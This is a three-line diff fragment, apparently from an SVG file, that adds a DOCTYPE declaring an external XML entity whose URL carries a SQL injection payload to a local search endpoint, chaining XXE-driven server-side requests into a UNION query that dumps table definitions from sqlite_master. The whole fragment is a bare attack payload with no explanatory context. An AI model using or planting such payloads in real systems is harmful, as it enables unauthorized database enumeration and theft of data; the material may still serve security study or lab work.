@@ -1,0 +1,3 @@
+<!DOCTYPE svg [
+  <!ENTITY xxe SYSTEM "http://localhost:5000/search?q=%' UNION SELECT sql, sql FROM sqlite_master WHERE type='table'--">
+]>
